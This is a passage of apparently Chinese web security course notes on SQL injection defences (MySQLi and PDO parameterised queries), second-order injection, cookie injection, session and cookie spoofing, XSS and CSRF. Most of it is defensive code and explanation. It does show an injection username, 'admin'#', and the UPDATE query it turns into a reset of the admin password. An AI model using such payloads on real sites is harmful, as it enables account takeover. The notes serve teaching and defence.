class="string">&quot;Name: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; - Description: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;description&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>代码解析</strong>：</p>
<ul>
<li><strong><code>prepare()</code></strong>：预编译SQL语句，将用户输入作为参数。</li>
<li><strong><code>bind_param()</code></strong>：绑定参数到SQL语句中。</li>
<li><strong><code>execute()</code></strong>：执行SQL语句时，数据库将用户输入当作普通数据，不会解析为SQL逻辑。</li>
</ul>
</li>
<li><p><strong>优点</strong>：</p>
<ul>
<li>防护效果好，从根本上解决了SQL注入问题。</li>
<li>安全性高，不需要额外处理转义或编码问题。</li>
</ul>
</li>
<li><p><strong>缺点</strong>：</p>
<ul>
<li>需要学习和理解新语法。</li>
</ul>
</li>
</ul>
<p><strong>PDO参数化查询</strong></p>
<ul>
<li><p><strong>PDO</strong> 是PHP另一种操作数据库的方式，支持参数化查询。</p>
</li>
<li><p><strong>代码实现</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=localhost;dbname=lab&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置PDO错误模式为异常</span></span><br><span class="line">    <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备参数化SQL语句</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM books WHERE id = :id&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>], PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行SQL语句</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取查询结果</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Name: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; - Description: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;description&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>代码解析</strong>：</p>
<ul>
<li><strong><code>:id</code></strong> 是占位符，用户输入通过 <code>bindParam()</code> 绑定到占位符上。</li>
<li><strong><code>PDO::PARAM_INT</code></strong> 指定参数的类型为整数，进一步增强安全性。</li>
</ul>
</li>
<li><p><strong>优点</strong>：</p>
<ul>
<li>同样能从根本上防护SQL注入攻击。</li>
<li>支持多种数据库（如MySQL、PostgreSQL、SQLite）。</li>
</ul>
</li>
<li><p><strong>缺点</strong>：</p>
<ul>
<li>学习成本稍高。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="其他防护措施"><a href="#其他防护措施" class="headerlink" title="其他防护措施"></a><strong>其他防护措施</strong></h6><p>除了代码防护，还可以通过其他手段增强安全性：</p>
<ol>
<li><p><strong>限制用户输入</strong></p>
<ul>
<li><p>对用户输入的数据进行严格的格式验证，例如只允许数字或字母。</p>
</li>
<li><p>示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>优点</strong>：能阻止部分注入攻击。</p>
</li>
<li><p><strong>缺点</strong>：对复杂数据的防护有限。</p>
</li>
</ul>
</li>
<li><p><strong>限制数据库权限</strong></p>
<ul>
<li>最小权限原则：<ul>
<li>应用程序使用的数据库账户只授予必要的权限（如查询和插入）。</li>
<li>禁止高权限操作（如删除或修改数据库结构）。</li>
</ul>
</li>
<li><strong>优点</strong>：即使注入攻击成功，损失也会减少。</li>
<li><strong>缺点</strong>：无法完全杜绝攻击。</li>
</ul>
</li>
<li><p><strong>使用Web应用防火墙（WAF）</strong></p>
<ul>
<li>部署WAF可以检测和拦截常见的SQL注入攻击请求。</li>
<li><strong>优点</strong>：无需修改代码即可提供额外防护。</li>
<li><strong>缺点</strong>：需要额外的资源和配置。</li>
</ul>
</li>
</ol>
<h6 id="防护对比总结"><a href="#防护对比总结" class="headerlink" title="防护对比总结"></a><strong>防护对比总结</strong></h6><div class="table-container">
<table>
<thead>
<tr>
<th><strong>防护方式</strong></th>
<th><strong>优点</strong></th>
<th><strong>缺点</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>转义函数</strong></td>
<td>简单易用，能防护基本攻击</td>
<td>有宽字符绕过风险，不彻底</td>
</tr>
<tr>
<td><strong>参数化查询</strong></td>
<td>根本性解决注入问题，安全性高</td>
<td>需要学习新的语法，稍复杂</td>
</tr>
<tr>
<td><strong>限制用户输入</strong></td>
<td>简单直接，适用于简单场景</td>
<td>不适用于复杂的数据输入</td>
</tr>
<tr>
<td><strong>限制数据库权限</strong></td>
<td>减少攻击损失，增强数据库安全</td>
<td>不能防止注入攻击发生</td>
</tr>
<tr>
<td><strong>Web应用防火墙</strong></td>
<td>提供额外的安全层，拦截多种攻击</td>
<td>需要额外配置，可能影响性能</td>
</tr>
</tbody>
</table>
</div>
<h4 id="项目5-更新密码二阶注入攻击"><a href="#项目5-更新密码二阶注入攻击" class="headerlink" title="项目5 更新密码二阶注入攻击"></a>项目5 更新密码二阶注入攻击</h4><ul>
<li><p>原理：利用 SQL 注入攻击，通过注册一个特殊的账号，并使用修改密码功能，绕过权限检查，修改其他账号的密码。</p>
</li>
<li><p>概念：SQL 注入攻击、二阶注入攻击、Session 验证、SQL 语句拼接、信息泄露。</p>
</li>
</ul>
<h5 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a><strong>二阶SQL注入</strong></h5><ul>
<li><strong>定义</strong>：<ul>
<li>一阶注入：攻击字符串直接通过HTTP请求注入数据库，立即执行（如万能密码）。</li>
<li>二阶注入：攻击字符串先存储在数据库中，再通过后续查询或更新操作引发攻击。</li>
</ul>
</li>
<li><strong>特点</strong>：<ul>
<li>隐蔽性强，绕过一次性防护措施（如转义）。</li>
<li>攻击在二次数据库交互时发生。</li>
</ul>
</li>
<li><strong>危害</strong>：<ul>
<li>修改或删除数据库内容。</li>
<li>篡改敏感数据（如用户密码）。</li>
</ul>
</li>
</ul>
<h5 id="更新密码与二阶注入攻击"><a href="#更新密码与二阶注入攻击" class="headerlink" title="更新密码与二阶注入攻击"></a><strong>更新密码与二阶注入攻击</strong></h5><ul>
<li><p>在密码更新过程中，若SQL语句未对输入数据进行防护，可能引发二阶注入。</p>
</li>
<li><p>示例：更新密码时，使用未处理的用户数据构造SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> passcode <span class="operator">=</span> <span class="string">&#x27;$pass&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>如果<code>$username</code>中包含恶意SQL代码（如<code>admin&#39;#</code>），可能导致更新逻辑被破坏。</p>
</li>
<li><p><strong>分析</strong>：</p>
<ul>
<li><p><strong>注册功能</strong>：</p>
<ul>
<li><p>使用转义函数处理输入，将单引号和井号转义后存储，未破坏SQL语句逻辑。</p>
</li>
<li><p>示例SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, passcode) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin\&#x27;</span>#<span class="string">&#x27;, &#x27;</span><span class="number">123456</span><span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>更新密码功能</strong>：</p>
<ul>
<li><p>更新密码时未对输入参数进行完整防护。</p>
</li>
<li><p>构造的SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> passcode <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span># <span class="keyword">AND</span> passcode <span class="operator">=</span> <span class="string">&#x27;123456&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>#</code>注释掉后续条件，使得查询条件变为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> passcode <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>结果：仅用户<code>admin</code>的密码被修改。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="二阶注入攻击防护"><a href="#二阶注入攻击防护" class="headerlink" title="二阶注入攻击防护"></a>二阶注入攻击防护</h5><ol>
<li><p><strong>PHP转义函数</strong>：</p>
<ul>
<li><p>使用 <code>mysqli_real_escape_string()</code> 转义特殊字符。</p>
</li>
<li><p>修改代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试结果：</p>
<ul>
<li>重新登录并修改密码，数据库中<code>admin&#39;#</code>的密码被更新，而<code>admin</code>的密码保持不变。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>MySQLi参数化更新</strong>：</p>
<ul>
<li><p>使用参数化查询防护注入攻击。</p>
</li>
<li><p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;UPDATE users SET passcode = ? WHERE username = ? AND passcode = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$new_pass</span>, <span class="variable">$username</span>, <span class="variable">$current_pass</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试结果：</p>
<ul>
<li>更新密码功能正常，防护二阶注入攻击。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>正则表达式过滤</strong>：</p>
<ul>
<li><p>对用户名和密码设置规范：</p>
<ul>
<li>只能使用小写字母、数字和下划线，长度限制32字符。</li>
</ul>
</li>
<li><p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]&#123;1,32&#125;$/&#x27;</span>, <span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;用户名格式不合法&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h4 id="项目6-Cookie-注入攻击"><a href="#项目6-Cookie-注入攻击" class="headerlink" title="项目6 Cookie 注入攻击"></a>项目6 Cookie 注入攻击</h4><ul>
<li><p>原理：利用 SQL 注入攻击，通过修改浏览器的 Cookie 信息，绕过登录验证，获取用户权限。</p>
</li>
<li><p>概念：SQL 注入攻击、Cookie、SessionID、信息泄露、Cookie 编辑插件。</p>
</li>
</ul>
<h5 id="Cookie的概念"><a href="#Cookie的概念" class="headerlink" title="Cookie的概念"></a><strong>Cookie的概念</strong></h5><ul>
<li><strong>定义</strong>：<ul>
<li>Cookie是Web服务器存储在客户端的一小段数据，用于保存用户状态。</li>
<li>应用场景：免登录功能、保存用户偏好、统计访问数据等。</li>
</ul>
</li>
<li><strong>格式</strong>：<ul>
<li>键值对：<code>key=value</code>。</li>
<li>URL编码：键和值必须进行URL编码。</li>
<li>多对Cookie之间用分号和空格分隔。</li>
</ul>
</li>
<li><strong>生命周期</strong>：<ul>
<li>设置<code>Expires</code>属性决定Cookie的有效期。</li>
<li>不设置<code>Expires</code>：浏览器关闭后Cookie失效。</li>
</ul>
</li>
</ul>
<h5 id="Cookie与Session的区别"><a href="#Cookie与Session的区别" class="headerlink" title="Cookie与Session的区别"></a><strong>Cookie与Session的区别</strong></h5><div class="table-container">
<table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>Cookie</strong></th>
<th><strong>Session</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>存储位置</strong></td>
<td>客户端</td>
<td>服务器</td>
</tr>
<tr>
<td><strong>信息安全性</strong></td>
<td>较低，用户可查看和修改</td>
<td>较高，用户无法直接访问</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>保存用户偏好、免登录等</td>
<td>保存用户状态（如登录状态）</td>
</tr>
</tbody>
</table>
</div>
<h5 id="Cookie注入攻击"><a href="#Cookie注入攻击" class="headerlink" title="Cookie注入攻击"></a><strong>Cookie注入攻击</strong></h5><ul>
<li><strong>原理</strong>：<ul>
<li>攻击者通过修改Cookie的内容，将恶意SQL语句嵌入其中，提交给服务器。</li>
<li>攻击过程类似于Post型或Get型SQL注入，但更隐蔽。</li>
</ul>
</li>
<li><strong>危害</strong>：<ul>
<li>数据库暴露：泄露敏感数据。</li>
<li>系统篡改：修改或破坏数据库内容。</li>
<li>Cookie SQL 注入攻击与常见的 GET/POST SQL 注入方式类似，其区别仅在于数据提交方式的不同，但危害一致。通过不当的查询操作，攻击者可访问甚至更改数据库中的敏感信息。</li>
</ul>
</li>
</ul>
<h5 id="Cookie注入攻击防护"><a href="#Cookie注入攻击防护" class="headerlink" title="Cookie注入攻击防护"></a>Cookie注入攻击防护</h5><ol>
<li><p><strong>转义函数</strong>：</p>
<ul>
<li><p>使用<code>mysqli_real_escape_string()</code>对Cookie值进行转义。</p>
</li>
<li><p>修改代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;account&#x27;</span>]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试结果：</p>
<ul>
<li>修改Cookie内容后，SQL注入攻击失效。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>参数化查询</strong>：</p>
<ul>
<li><p>使用MySQLi或PDO实现参数化查询。</p>
</li>
<li><p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;account&#x27;</span>]);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h4 id="项目7-HTTP-头部注入攻击"><a href="#项目7-HTTP-头部注入攻击" class="headerlink" title="项目7 HTTP 头部注入攻击"></a>项目7 HTTP 头部注入攻击</h4><ul>
<li><p>原理：利用 SQL 注入攻击，通过修改浏览器的 HTTP 头部信息，绕过登录验证，获取用户权限。</p>
</li>
<li><p>概念：SQL 注入攻击、HTTP 头部、User-Agent、信息泄露、Live HTTP Headers 插件。</p>
</li>
</ul>
<h3 id="第三篇-前端攻击及防护"><a href="#第三篇-前端攻击及防护" class="headerlink" title="第三篇 前端攻击及防护"></a>第三篇 前端攻击及防护</h3><h4 id="项目8-Session-欺骗攻击"><a href="#项目8-Session-欺骗攻击" class="headerlink" title="项目8 Session 欺骗攻击"></a>项目8 Session 欺骗攻击</h4><ul>
<li><p>原理：利用 Session 欺骗攻击，通过复制登录用户的 SessionID，绕过登录验证，获取用户权限。</p>
</li>
<li><p>概念：Session 欺骗、SessionID、信息泄露、User-Agent 验证、退出登录。</p>
</li>
</ul>
<h5 id="Session欺骗攻击基础"><a href="#Session欺骗攻击基础" class="headerlink" title="Session欺骗攻击基础"></a><strong>Session欺骗攻击基础</strong></h5><ol>
<li><strong>Session的工作原理</strong>：<ul>
<li>用户登录后，服务器端生成Session用于保存用户状态，并创建一个SessionID作为用户身份标识。</li>
<li>浏览器通过Cookie存储SessionID，并在后续访问中将SessionID发送至服务器进行身份验证。</li>
</ul>
</li>
<li><strong>Session欺骗攻击原理</strong>：<ul>
<li>攻击者通过复制合法用户的SessionID，使未授权的用户伪装成已登录用户，从而获得相应的访问权限。</li>
<li>攻击者通常无法完成需要密码确认的操作（如修改密码）。</li>
</ul>
</li>
<li><strong>Session欺骗的危害</strong>：<ul>
<li>身份被冒用可能导致权限控制失效。</li>
<li>未经授权的用户可能访问敏感资源。</li>
</ul>
</li>
</ol>
<h5 id="Session欺骗攻击测试"><a href="#Session欺骗攻击测试" class="headerlink" title="Session欺骗攻击测试"></a><strong>Session欺骗攻击测试</strong></h5><ol>
<li><strong>攻击步骤</strong>：<ul>
<li><strong>环境准备</strong>：利用已有登录功能的网站（如项目3），在不同浏览器上实施攻击。</li>
<li>获取SessionID：<ul>
<li>在浏览器中登录后，通过开发者工具或插件（如Live HTTP Headers）获取SessionID。</li>
</ul>
</li>
<li>实施攻击：<ul>
<li>在另一浏览器中通过修改请求头中的SessionID，伪装为已登录用户。</li>
</ul>
</li>
</ul>
</li>
<li><strong>测试现象</strong>：<ul>
<li>未登录的情况下，通过伪造SessionID可以直接获得与登录用户相同的权限。</li>
</ul>
</li>
</ol>
<h5 id="Session欺骗防护措施"><a href="#Session欺骗防护措施" class="headerlink" title="Session欺骗防护措施"></a><strong>Session欺骗防护措施</strong></h5><h6 id="1-使用注销机制"><a href="#1-使用注销机制" class="headerlink" title="1. 使用注销机制"></a><strong>1. 使用注销机制</strong></h6><ul>
<li>用户退出登录时调用服务器端的注销函数（如logout.php），销毁Session。</li>
<li>避免仅关闭浏览器，而未主动注销登录造成Session仍有效。</li>
</ul>
<h6 id="2-设置Session的生存时间"><a href="#2-设置Session的生存时间" class="headerlink" title="2. 设置Session的生存时间"></a><strong>2. 设置Session的生存时间</strong></h6><ul>
<li>PHP默认Session有效期为1440秒（24分钟）。</li>
<li>在程序中严格控制Session生存时间，避免长期暴露的SessionID被盗用。</li>
</ul>
<h6 id="3-检测User-Agent的一致性"><a href="#3-检测User-Agent的一致性" class="headerlink" title="3. 检测User-Agent的一致性"></a><strong>3. 检测User-Agent的一致性</strong></h6><ul>
<li>登录后将浏览器的User-Agent信息存储在Session中。</li>
<li>每次请求时比对User-Agent是否一致，不一致则判定为异常访问。</li>
</ul>
<h6 id="4-重置SessionID"><a href="#4-重置SessionID" class="headerlink" title="4. 重置SessionID"></a><strong>4. 重置SessionID</strong></h6><ul>
<li>在Session会话启动或刷新时调用<code>session_regenerate_id(true)</code>重置SessionID，使旧的SessionID失效。</li>
<li>此方法虽不能完全防护，但可增加攻击难度。</li>
</ul>
<h4 id="项目9-Cookie-欺骗攻击"><a href="#项目9-Cookie-欺骗攻击" class="headerlink" title="项目9 Cookie 欺骗攻击"></a>项目9 Cookie 欺骗攻击</h4><ul>
<li><p>原理：利用 Cookie 欺骗攻击，通过复制登录用户的 Cookie 信息，绕过登录验证，获取用户权限。</p>
</li>
<li><p>概念：Cookie 欺骗、信息泄露、特殊键值对、User-Agent 验证、退出登录。</p>
</li>
</ul>
<h5 id="Cookie工作原理"><a href="#Cookie工作原理" class="headerlink" title="Cookie工作原理"></a><strong>Cookie工作原理</strong></h5><ul>
<li><strong>Cookie定义</strong>：存储于客户端，用于保存用户信息的小型文本数据。</li>
<li><strong>用途</strong>：会话保持、免登录认证等。</li>
<li><strong>有效期</strong>：可以设置生命周期，短期存储会话信息或长期存储用户信息。</li>
</ul>
<h5 id="Cookie欺骗攻击"><a href="#Cookie欺骗攻击" class="headerlink" title="Cookie欺骗攻击"></a><strong>Cookie欺骗攻击</strong></h5><ul>
<li><strong>原理</strong>：攻击者获取或猜测合法用户的Cookie，将其伪装注入其他浏览器，绕过身份验证。</li>
<li>危害：<ul>
<li>攻击者获得合法用户权限。</li>
<li>Cookie长期有效，比Session更易被攻击。</li>
</ul>
</li>
</ul>
<h5 id="Cookie欺骗测试"><a href="#Cookie欺骗测试" class="headerlink" title="Cookie欺骗测试"></a>Cookie欺骗测试</h5><ol>
<li>准备工作：<ul>
<li>修改数据库（添加记录客户端信息的字段）。</li>
<li>在现有网站中启用Cookie认证。</li>
</ul>
</li>
<li>测试过程：<ul>
<li><strong>方式一</strong>：直接猜测Cookie键值对。</li>
<li><strong>方式二</strong>：在一个浏览器中登录获取Cookie信息，复制到另一浏览器实现欺骗。</li>
</ul>
</li>
</ol>
<h5 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h5><ol>
<li>设置特殊键值对：<ul>
<li>使用MD5散列登录密码生成不易猜测的键值对。</li>
</ul>
</li>
<li>检测User-Agent一致性：<ul>
<li>登录时将User-Agent信息保存为散列值，后续请求中比对一致性。</li>
</ul>
</li>
</ol>
<h4 id="项目10-XSS-跨站攻击"><a href="#项目10-XSS-跨站攻击" class="headerlink" title="项目10 XSS 跨站攻击"></a>项目10 XSS 跨站攻击</h4><ul>
<li><p>原理：利用 XSS 跨站攻击，通过在用户输入的内容中嵌入恶意脚本，绕过浏览器安全机制，执行攻击者控制的代码。</p>
</li>
<li><p>概念：XSS 跨站攻击、持久型 XSS、非持久型 XSS、HTML 转义、JavaScript 转义、Cookie 的 HttpOnly 属性。</p>
</li>
</ul>
<h5 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h5><ol>
<li><strong>XSS跨站攻击原理</strong>：<ul>
<li>XSS表示Cross Site Scripting，用于区别于CSS（层叠样式表）。</li>
<li>本质：通过提交恶意HTML或JavaScript代码，当被嵌入网页后，代码会被执行，导致网页运行非设计功能的脚本。</li>
<li>常见场景：用户提交信息（如发帖、留言等）中嵌入恶意代码。</li>
</ul>
</li>
<li><strong>XSS攻击分类</strong>：<ul>
<li><strong>非持久型XSS攻击</strong>：恶意代码不存储在数据库中。</li>
<li><strong>持久型XSS攻击</strong>：恶意代码存储在数据库中，浏览器解析时会被执行。</li>
</ul>
</li>
<li><strong>XSS攻击危害</strong>：<ul>
<li>干扰网页正常功能（如弹窗攻击）。</li>
<li>窃取用户Cookie，威胁账号安全。</li>
<li>执行其他攻击（如Session欺骗、获取敏感信息等）。</li>
</ul>
</li>
</ol>
<h5 id="XSS攻击防护"><a href="#XSS攻击防护" class="headerlink" title="XSS攻击防护"></a>XSS攻击防护</h5><ul>
<li>设置Cookie的HttpOnly属性：<ul>
<li>修改PHP代码：使用<code>setcookie()</code>函数设置<code>HttpOnly</code>。</li>
<li>效果：阻止JavaScript脚本访问Cookie，避免SessionID被窃取。</li>
</ul>
</li>
<li>HTML转义：<ul>
<li>方法：对用户输入的HTML代码进行转义。</li>
<li>示例：使用<code>htmlentities()</code>或<code>htmlspecialchars()</code>函数。</li>
<li>效果：防止恶意HTML或JavaScript代码被浏览器解析和执行。</li>
</ul>
</li>
<li>JavaScript转义：<ul>
<li>问题：JavaScript中可通过Unicode编码绕过HTML转义。</li>
<li>解决方案：使用<code>json_encode()</code>函数对用户数据进行安全编码。</li>
</ul>
</li>
</ul>
<h4 id="项目11-CSRF-跨站伪造请求攻击"><a href="#项目11-CSRF-跨站伪造请求攻击" class="headerlink" title="项目11 CSRF 跨站伪造请求攻击"></a>项目11 CSRF 跨站伪造请求攻击</h4><ul>
<li><p>原理：利用 CSRF 跨站伪造请求攻击，通过诱导用户点击恶意链接，以用户的名义向目标网站发送请求，执行恶意操作。</p>
</li>
<li><p>概念：CSRF 跨站攻击、同源策略、HTTP Referer 验证、操作确认对话框、Token 验证。</p>
</li>
</ul>
<h5 id="CSRF攻击基础知识"><a href="#CSRF攻击基础知识" class="headerlink" title="CSRF攻击基础知识"></a>CSRF攻击基础知识</h5><ol>
<li><strong>CSRF攻击的原理</strong>：<ul>
<li>全称：Cross Site Request Forgery（跨站伪造请求）。</li>
<li>核心机制：利用用户浏览器中保存的身份认证信息（如Cookie），在用户不知情的情况下伪造请求并冒用用户身份。</li>
<li>形成条件：<ul>
<li>用户已登录目标网站，浏览器中保存了认证Cookie。</li>
<li>用户访问了另一个含有恶意代码的网页，该网页向目标网站发起伪造请求。</li>
</ul>
</li>
<li>关键特点：攻击者无法直接获取用户数据，但可冒充用户操作。</li>
</ul>
</li>
<li><strong>CSRF攻击的危害</strong>：<ul>
<li>在用户不知情的情况下完成伪造操作（如转账、消费积分、修改信息等）。</li>
<li>破坏网站的权限控制机制。</li>
<li>危害程度依赖于目标网站的敏感操作内容。</li>
</ul>
</li>
</ol>
<h5 id="CSRF攻击测试"><a href="#CSRF攻击测试" class="headerlink" title="CSRF攻击测试"></a>CSRF攻击测试</h5><ol>
<li><strong>测试过程</strong>：<ul>
<li><strong>测试前提</strong>：用户在浏览器中已登录目标网站。</li>
<li>测试实施：<ul>
<li>在保持目标网站登录状态的浏览器中，访问攻击网页（<code>csrf.html</code>）。</li>
<li>点击攻击链接，目标网站后台接收伪造请求并添加恶意用户。</li>
</ul>
</li>
<li>测试现象：<ul>
<li>用户未察觉情况下，目标网站新增了恶意用户。</li>
</ul>
</li>
<li>测试条件分析：<ul>
<li>成功的CSRF攻击需满足以下条件：<ol>
<li>用户登录目标网站。</li>
<li>用户访问了含有恶意代码的网页。</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>测试结论</strong>：<ul>
<li>CSRF攻击的本质是利用了用户身份认证机制的漏洞。</li>
<li>Get和Post请求均可用于CSRF攻击（通过隐藏表单实现Post提交）。</li>
</ul>
</li>
</ol>
<h5 id="CSRF攻击防护"><a href="#CSRF攻击防护" class="headerlink" title="CSRF攻击防护"></a>CSRF攻击防护</h5><p><strong>防护方法1：HTTP Referer验证</strong></p>
<ul>
<li><p>原理：</p>
<ul>
<li>检查请求头中的Referer字段，验证请求来源是否合法。</li>
</ul>
